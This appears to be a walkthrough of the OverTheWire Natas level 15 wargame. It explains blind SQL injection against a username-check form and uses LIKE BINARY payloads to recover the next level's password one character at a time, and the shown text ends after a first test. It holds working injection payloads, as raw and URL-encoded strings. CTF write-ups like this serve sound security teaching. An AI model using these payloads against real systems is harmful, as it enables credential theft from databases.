# 🔐 Natas15 Walkthrough

In this level, we only have a `username` form, that's used to check the existence of a username in the database. Naturally we want to check if a the database contains the **natas16** information. Putting natas16 into the form we get: 

```
This user exists.
```

This means that this form has access to natas16 login data, if there is a username you better think there is a ***password*** somewhere near it too. 

## Where do we begin?

Firstly, let's do the exact same thing we did in natas14, check if the [View sourcecode](http://natas15.natas.labs.overthewire.org/index-source.html) `.php` script has a debug **"mode":**

```php
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
}
```

**Clearly, it does.** Let's insert it into the url like before, this time without the `password` variable, because there is no `password` form:

```
http://natas15.natas.labs.overthewire.org/?username=&debug
```

This shows us the contents of the `username` variable, as before this will be helpfull in manipulating our `""` injection.

## Trying basic SQL injection

Let's try the same input as we did in the previous level:
```
INPUT:
http://natas15.natas.labs.overthewire.org?username=password" OR "1&debug

OUTPUT:
Executing query: SELECT * from users where username="password" OR "1"
This user exists.
```
**It works** — but this query just checks if any matching row exists. There’s no password input or output here. So instead of bypassing authentication, we now have to figure out the password for natas16 **one character at a time** this is called ***blind SQL injection.***


## Blind SQL injection with `LIKE BINARY`

#### What is LIKE BINARY?
`LIKE BINARY` is a SQL operator used to perform **case-sensitive pattern matching**. It works like the standard `LIKE`, but with `BINARY`, comparisons **respect the exact letter casing** (uppercase ≠ lowercase).

- ✅ Use when you want to match patterns exactly, including letter case.  
- ❌ Without `BINARY`, `LIKE` treats uppercase and lowercase letters as the same (in most databases like MySQL).
```
Without `BINARY` (case-insensitive):
SELECT * FROM users WHERE password LIKE 'pass%';

✅ Matches: `password`, `Pass123`, `PASS`

-------------------------------------------------------

With `BINARY` (case-sensitive):
SELECT * FROM users WHERE password LIKE BINARY 'pass%';

✅ Matches: `password`  
❌ Doesn’t match: `Password`, `PASS`
```

#### LIKE BINARY Tests

For the sake of readability, i wont include the whole url, you can either paste it into the url to keep an eye on the output or in the form.

>[!IMPORTANT]
>Remember that url characters have their own encoding!

**Let's use a querie like this:**

```
form:
username = natas16" and password LIKE BINARY "%c%


example of ulr:
http://natas15.natas.labs.overthewire.org/?username=natas16%22%20and%20password%20LIKE%20BINARY%20%22%c%&debug
```
That checks if the password contains `c`. And indeed ***This user exists.***
